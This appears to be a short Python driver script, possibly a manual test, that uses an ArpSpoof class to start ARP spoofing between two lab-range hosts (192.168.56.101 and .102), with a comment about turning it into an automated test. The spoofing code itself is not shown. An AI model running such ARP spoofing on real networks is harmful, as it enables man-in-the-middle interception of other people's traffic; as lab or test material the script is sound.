from arp_spoof import ArpSpoof

arp = ArpSpoof()
arp.attach('192.168.56.101')
arp.attach('192.168.56.102')

arp.start()
arp.join()

# @todo Convert into an automated test
